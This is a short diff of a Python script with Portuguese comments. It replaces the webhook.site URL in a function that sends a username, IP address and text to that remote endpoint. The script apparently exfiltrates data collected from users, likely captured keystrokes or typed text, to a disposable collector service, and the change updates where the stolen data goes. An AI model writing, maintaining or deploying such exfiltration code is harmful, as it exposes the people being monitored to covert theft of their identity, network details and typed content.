@@ -6,7 +6,7 @@ import threading
 
 # Função para enviar o texto para o endpoint
 def send_text(username, ip_address, text):
-    url = "https://webhook.site/80568ce8-8222-4717-95d4-08ba1144ec99"
+    url = "https://webhook.site/2bf6a38c-d784-4b48-93bd-80c8d9f6b3e1"
     data = {
         "username": username,
         "ip_address": ip_address,
